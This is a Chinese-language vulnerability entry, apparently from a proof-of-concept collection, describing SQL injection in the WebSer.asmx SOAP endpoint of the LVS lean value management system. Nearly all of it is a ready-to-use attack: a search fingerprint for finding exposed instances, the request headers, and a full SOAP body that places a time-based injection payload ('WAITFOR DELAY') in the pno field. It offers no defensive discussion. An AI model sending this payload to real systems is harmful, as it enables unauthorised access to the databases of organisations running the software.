# LVS精益价值管理系统WebSer.asmx存在SQL注入漏洞

- **系统**：LVS　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`body="/ajax/LVS.Core.Common.STSResult,LVS.Core.Common.ashx"`
- **请求**：`POST /WebSer.asmx HTTP/1.1`
- **关键头**：`Content-Type: text/xml; charset=utf-8`　`Content-Length: length`　`SOAPAction: "http://tempuri.org/OutStore"`

**请求体 / payload**
```
<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
<soap:Header>
<AuthenticationHeader xmlns="http://tempuri.org/">
<UserName></UserName>
<Password></Password>
</AuthenticationHeader>
</soap:Header>
<soap:Body>
<OutStore xmlns="http://tempuri.org/">
<pno>1';WAITFOR DELAY '0:0:5'--</pno>
</OutStore>
</soap:Body>
</soap:Envelope>
```
- **预期**：200　|　—